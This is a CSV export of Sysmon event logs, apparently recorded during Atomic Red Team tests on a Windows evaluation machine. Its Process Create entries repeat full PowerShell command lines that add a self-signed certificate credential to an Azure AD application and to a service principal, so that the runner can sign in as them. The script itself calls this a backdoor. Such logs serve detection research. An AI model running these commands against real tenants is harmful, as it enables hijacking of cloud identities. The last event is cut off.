Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,EventID,EventRecordID,FileVersion,Hashes,Image,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Message,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,QueryName,QueryResults,QueryStatus,RenderingInfo,RuleName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:40:16.106,,,11,19575,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:40:16.106

ProcessGuid: {f57bd86a-8baf-658c-c601-000000000f00}

ProcessId: 6052

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_11r4soig.zb2.ps1

CreationUtcTime: 2023-12-27 20:40:16.106

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8baf-658c-c601-000000000f00},3588,6052,,,,,"
      ",-,2023-12-27T20:40:16.1178797Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_11r4soig.zb2.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:40:16.106,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:40:16.1178797Z""/>
      <EventRecordID>19575</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:40:16.106</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8baf-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">6052</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_11r4soig.zb2.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:40:16.106</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:40:16.106

ProcessGuid: {f57bd86a-8baf-658c-c601-000000000f00}

ProcessId: 6052

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_11r4soig.zb2.ps1

CreationUtcTime: 2023-12-27 20:40:16.106

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential > $null

$app = Get-AzureADApplication -SearchString \""""SuperApp\"""" | Select-Object -First 1
if ($app -eq $null) { Write-Warning \""""Application not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19574,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:15.997

ProcessGuid: {f57bd86a-8baf-658c-c601-000000000f00}

ProcessId: 6052

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft速 Windows速 Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential > $null

$app = Get-AzureADApplication -SearchString \""""SuperApp\"""" | Select-Object -First 1
if ($app -eq $null) { Write-Warning \""""Application not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8baf-658c-c601-000000000f00},3588,6052,Microsoft速 Windows速 Operating System,,,,"
      ",-,2023-12-27T20:40:15.9992747Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:40:15.997,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:40:15.9992747Z""/>
      <EventRecordID>19574</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:40:15.997</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8baf-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">6052</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential &gt; $null

$app = Get-AzureADApplication -SearchString \""""SuperApp\"""" | Select-Object -First 1
if ($app -eq $null) { Write-Warning \""""Application not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:15.997

ProcessGuid: {f57bd86a-8baf-658c-c601-000000000f00}

ProcessId: 6052

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential &gt; $null

$app = Get-AzureADApplication -SearchString \""""SuperApp\"""" | Select-Object -First 1
if ($app -eq $null) { Write-Warning \""""Application not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:40:12.660,,,11,19573,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:40:12.660

ProcessGuid: {f57bd86a-8bac-658c-c401-000000000f00}

ProcessId: 5656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_qdvrwjjs.sko.ps1

CreationUtcTime: 2023-12-27 20:40:12.660

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8bac-658c-c401-000000000f00},3588,5656,,,,,"
      ",-,2023-12-27T20:40:12.6680558Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_qdvrwjjs.sko.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:40:12.660,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:40:12.6680558Z""/>
      <EventRecordID>19573</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:40:12.660</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8bac-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">5656</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_qdvrwjjs.sko.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:40:12.660</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:40:12.660

ProcessGuid: {f57bd86a-8bac-658c-c401-000000000f00}

ProcessId: 5656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_qdvrwjjs.sko.ps1

CreationUtcTime: 2023-12-27 20:40:12.660

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential > $null

$sp = Get-AzureADServicePrincipal -SearchString \""""SuperSP\"""" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning \""""Service Principal not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19572,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:12.524

ProcessGuid: {f57bd86a-8bac-658c-c401-000000000f00}

ProcessId: 5656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft速 Windows速 Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential > $null

$sp = Get-AzureADServicePrincipal -SearchString \""""SuperSP\"""" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning \""""Service Principal not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8bac-658c-c401-000000000f00},3588,5656,Microsoft速 Windows速 Operating System,,,,"
      ",-,2023-12-27T20:40:12.5254992Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:40:12.524,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:40:12.5254992Z""/>
      <EventRecordID>19572</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:40:12.524</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8bac-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">5656</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential &gt; $null

$sp = Get-AzureADServicePrincipal -SearchString \""""SuperSP\"""" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning \""""Service Principal not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:12.524

ProcessGuid: {f57bd86a-8bac-658c-c401-000000000f00}

ProcessId: 5656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""p4sswd\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""jonh@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential &gt; $null

$sp = Get-AzureADServicePrincipal -SearchString \""""SuperSP\"""" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning \""""Service Principal not found\""""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName \""""atomicredteam.example.com\"""" -FriendlyName \""""AtomicCert\"""" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider \""""Microsoft Enhanced RSA and AES Cryptographic Provider\"""" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host \""""Generated certificate \""""\""""$($cert.Thumbprint)\""""\""""\""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""""AtomicTest\"""" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
